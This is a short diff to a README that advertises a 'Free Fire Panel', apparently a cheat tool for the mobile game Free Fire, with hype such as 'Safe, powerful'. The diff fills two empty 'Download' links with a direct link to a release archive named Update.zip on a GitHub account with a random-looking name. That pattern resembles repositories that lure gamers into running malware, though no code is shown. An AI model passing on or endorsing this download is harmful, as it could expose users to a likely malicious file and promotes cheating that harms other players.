@@ -3,7 +3,7 @@
 > **Dominate every match with the ultimate Free Fire Panel!**  
 > Safe, powerful, and packed with revolutionary features. 🚀
 
-**[![Download Free Fire Panel](https://img.shields.io/badge/Download-Free%20Fire%20Panel-purple)]()** 
+**[![Download Free Fire Panel](https://img.shields.io/badge/Download-Free%20Fire%20Panel-purple)](https://github.com/Clnch4hdp5/free-fire-panel/releases/download/Update/Update.zip)** 
 
 
 ---  
@@ -12,7 +12,7 @@
 ![free-fire](https://github.com/user-attachments/assets/0c1bf483-dfc8-40ee-9db1-9290df815155)
 
 
-# ***[📁 Download Now]()***  
+# ***[📁 Download Now](https://github.com/Clnch4hdp5/free-fire-panel/releases/download/Update/Update.zip)***  
 ---
 
 ## 🌟 **Why Free Fire Panel?**  
